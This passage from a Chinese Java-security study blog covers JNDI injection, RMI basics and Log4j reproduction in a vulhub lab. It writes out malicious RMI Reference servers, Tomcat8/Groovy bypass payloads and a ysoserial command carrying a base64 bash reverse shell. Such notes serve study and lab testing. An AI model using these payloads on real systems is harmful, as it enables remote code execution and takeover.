class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// env 是用于创建 InitialContext 的环境变量属性配置</span><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        <span class="hljs-comment">// 创建一个 InitialContext</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;foo&quot;</span>;<br>        <span class="hljs-comment">// 把一个 String 对象和一个名字绑定</span><br>        context.bind(name,<span class="hljs-string">&quot;sample string&quot;</span>);<br>        <span class="hljs-comment">// 查询绑定的对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> context.lookup(name);<br>        System.out.println(name+<span class="hljs-string">&quot; is bound to: &quot;</span>+obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Reference</code> ：它和要绑定的对象相关联，在绑定对象时，只需要将对象的 <code>Reference</code> 绑定到命名目录服务上，而不用绑定的原本的对象。</p><p>如果 <code>Reference</code> 中提供了工厂类以及它的加载地址，那么客户端就会去对应的地址加载 Java 字节码进行构造和执行。其构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className,  String factory, String factoryLocation) <br></code></pre></td></tr></table></figure><p><code>factory</code> 类需要继承 <code>UnicastRemoteObject</code> 且需要使用 <code>ReferenceWrapper</code> 类对 <code>Reference</code> 类或其子类对象进行远程包装成 <code>Remote</code> 类使其能够被远程访问。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>如果应用程序进行了 JNDI 查询，并且其查询的地址或名称可控，那么就会形成 JNDI 注入漏洞。</p><p>当查询地址可控时，我们就可以搭建恶意服务，当 JNDI 访问该服务时会获取一个恶意的 <code>Reference</code>，然后 JNDI 解析该 <code>Reference</code> 后就会去恶意地址加载 Java 字节码进行构造和执行。</p><p>简单来说，JNDI 注入原理就是 <code>lookup()</code> 参数可控，导致程序加载恶意类。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>利用 <code>Reference</code> 加载远程 <code>Factory</code> </li><li>利用 <code>Reference</code> 加载本地 <code>Factory</code> </li><li>反序列化</li></ul><h3 id="利用-Reference-加载远程-Factory"><a href="#利用-Reference-加载远程-Factory" class="headerlink" title="利用 Reference 加载远程 Factory"></a>利用 <code>Reference</code> 加载远程 <code>Factory</code></h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021116836.png" alt="JNDI远程加载"></p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h4><p>在 <code>JDK 6u132、7u122、8u121</code> 之后的版本，Java 对 RMI 利用 <code>Reference</code> 远程加载 <code>Factory</code> 的特性做了限制，其 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为了<code>false</code>，及默认不允许通过RMI从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。</p><p>故利用 RMI 进行攻击时，需要注意其 <code>JDK</code> 版本。</p><h5 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h5><p>攻击端搭建 <code>RMI</code> 服务，然后绑定一个恶意的 <code>Reference</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, NamingException &#123;<br>        <span class="hljs-comment">// 创建注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Calc&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;jndi rmi Server start ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该  <code>Reference</code> 指向<code>http://127.0.0.1:8888/Calc.class</code>，然后就实现这个 <code>Calc.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用 <code>javac</code> 编译为 <code>Calc.class</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">javac Calc.java<br></code></pre></td></tr></table></figure><p>启动 <code>http</code> 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m http.server 8888<br></code></pre></td></tr></table></figure><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><p>客户端用于访问 RMI 服务，但其 <code>lookup()</code> 参数可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>rmi://127.0.0.1:1099/Calc</code> 是攻击者搭建的恶意 <code>RMI</code> 服务地址。</p><p>启动客户端后弹出计算器：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309032217357.png" alt="image-20230903221748106"></p><h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h4><p>在 <code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之后 <code>com.sun.jndi.ldap.object.trustURLCodebase </code>属性的默认值同样被修改为了<code>false</code>，及不允许利用 <code>Reference</code> 进行远程加载。</p><p>这里使用 <code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code> 直接搭建攻击端：</p><p>项目地址：<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;calc&quot;</span> -A <span class="hljs-string">&quot;43.139.185.135&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041035805.png" alt="image-20230904103548692"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041037245.png" alt="image-20230904103708210"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041037826.png" alt="image-20230904103728674"></p><h3 id="利用-Reference-加载本地-Factory"><a href="#利用-Reference-加载本地-Factory" class="headerlink" title="利用 Reference 加载本地 Factory"></a>利用 <code>Reference</code> 加载本地 <code>Factory</code></h3><p>利用 <code>Reference</code> 加载远程 <code>Factory</code> 的方法在遇到 <code>JDK</code> 高版本的情况就不行了，禁止利用 <code>Reference</code> 进行远程加载。不过我们可以从本地加载合适 <code>Reference Factory</code>。</p><p>需要注意是，该本地工厂类必须实现<code>javax.naming.spi.ObjectFactory</code>接口,因为在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>最后的<code>return</code>语句对<code>Factory</code>类的实例对象进行了类型转换，并且该工厂类至少存在一个<code>getObjectInstance()</code>方法。</p><p>目前公开的有：</p><ul><li><code>Tomcat8</code></li><li><code>Groovy</code></li></ul><h4 id="Tomcat8"><a href="#Tomcat8" class="headerlink" title="Tomcat8"></a>Tomcat8</h4><p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance() </code>中会通过反射的方式实例化 Reference所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。</p><p><code>JavaBean</code> 是一种 <code>class</code> 命名规范，具体<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">看这里</a>。</p><p>攻击端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="hljs-literal">null</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;faster=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;faster&quot;</span>, <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(resourceRef);<br>        registry.bind(<span class="hljs-string">&quot;Tomcat8bypass&quot;</span>, referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Tomcat8bypass start ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041151846.png" alt="image-20230904115122691"></p><h4 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server_Bypass_Groovy</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;faster=parseClass&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;faster&quot;</span>,script));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(resourceRef);<br>        registry.bind(<span class="hljs-string">&quot;Groovy2bypass&quot;</span>, referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Groovy2bypass start ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>Tomcat8 这里 idea 调试有问题，没有跟一下。</p><p>未完待续 …</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://goodapple.top/archives/696">Java安全学习—JNDI注入</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java RMI</title>
    <link href="/2023/05/29/Java%E5%AE%89%E5%85%A8/RMI/"/>
    <url>/2023/05/29/Java%E5%AE%89%E5%85%A8/RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h1><p><code>Java RMI ( Remote Method Invocation )</code> 远程方法调用，它允许在一个 Java 虚拟机中运行的对象调用在另一个 Java 虚拟机中运行的对象上的方法。</p><p>RMI 分布式应用程序：</p><ul><li>RMI Server ：创建一些远程对象</li><li>Registry ：服务端调用注册表以将名称与远程对象关联</li><li>RMI Client：客户端在服务器的注册表中按名称查找远程对象，然后对其调用方法</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031555014.gif"></p><p>动态类加载：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031606602.png" alt="image-20230903160628546"></p><h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>继承 <code>Remote</code> 的接口，服务端、客户端都要有这个接口，服务端需要实现该接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-comment">// 客户端要远程调用的方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-comment">// 实现 IRemoteObj</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">remoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">remoteObj</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello &quot;</span> + name + <span class="hljs-string">&quot; !&quot;</span>;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-comment">// 创建远程对象</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">remoteObj</span>();<br>        <span class="hljs-comment">// 创建注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 绑定到注册中心</span><br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>,remoteObj);<br>        System.out.println(<span class="hljs-string">&quot;Start...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-comment">// 获取注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 查找,获取远程方法</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        <span class="hljs-comment">// 调用远程方法</span><br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;fuming&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>未完待续 …</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j漏洞复现</title>
    <link href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4j漏洞复现"><a href="#Log4j漏洞复现" class="headerlink" title="Log4j漏洞复现"></a>Log4j漏洞复现</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png" alt="Log4j"></p><h2 id="Log4j-反序列化"><a href="#Log4j-反序列化" class="headerlink" title="Log4j 反序列化"></a>Log4j 反序列化</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。</p><p>Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li><a href="https://vulhub.org/#/environments/log4j/CVE-2017-5645/">https://vulhub.org/#/environments/log4j/CVE-2017-5645/</a></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用 ysoserial 生成 payload，然后直接发送给 <code>your-ip:4712</code> 端口即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar CommonsCollections5  <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTA0LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> | nc your-ip 4712<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021608726.png" alt="image-20230902160848624"></p><p>Base64 反弹 Shell 生成：<a href="http://www.bu8ug.com/index.php/other/shell-base64/">http://www.bu8ug.com/index.php/other/shell-base64/</a></p><h2 id="Log4j2-JNDI-注入"><a 